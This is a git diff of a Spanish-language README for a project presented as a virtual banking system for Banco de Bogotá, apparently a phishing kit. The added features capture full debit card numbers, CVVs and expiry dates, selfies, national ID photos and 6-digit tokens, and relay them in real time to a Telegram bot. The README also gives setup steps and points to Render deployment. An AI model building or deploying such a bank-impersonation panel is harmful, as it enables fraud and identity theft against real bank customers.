@@ -1,16 +1,20 @@
 # Panel de Bogotá - Banca Virtual
 
-Sistema de banca virtual para Banco de Bogotá con integración de Telegram Bot y Socket.io.
+Sistema de banca virtual para Banco de Bogotá con integración de Telegram Bot, Socket.io y verificación biométrica.
 
 ## 🚀 Características
 
 - ✅ Formularios de autenticación (Clave Segura y Tarjeta Débito)
+- ✅ Captura completa de datos de tarjeta débito (16 dígitos, CVV, fecha de vencimiento)
+- ✅ Verificación biométrica con captura de selfie
+- ✅ Captura de documento de identidad (cédula)
 - ✅ Verificación de token de 6 dígitos
-- ✅ Integración con Telegram Bot para notificaciones
+- ✅ Integración con Telegram Bot para notificaciones y envío de fotos
 - ✅ Comunicación en tiempo real con Socket.io
-- ✅ Diseño responsive y adaptable
-- ✅ Loading overlays profesionales
+- ✅ Diseño responsive y adaptable (desktop, tablet, móvil)
+- ✅ Loading overlays profesionales sin delays
 - ✅ Dashboard interactivo
+- ✅ Flujo de verificación en tiempo real
 
 ## 📋 Requisitos
 
@@ -18,13 +22,14 @@ Sistema de banca virtual para Banco de Bogotá con integración de Telegram Bot 
 - npm >= 9.0.0
 - Bot de Telegram configurado
 - Cuenta en Render.com (para deployment)
+- Navegador con soporte para WebRTC (para captura de cámara)
 
 ## 🔧 Instalación Local
 
 1. Clonar el repositorio:
 ```bash
-git clone https://github.com/hanselrosales255/bogota.git
-cd bogota
+git clone https://github.com/casado1028tirito/bogota-gol.git
+cd bogota-gol
 ```
 
 2. Instalar dependencias:
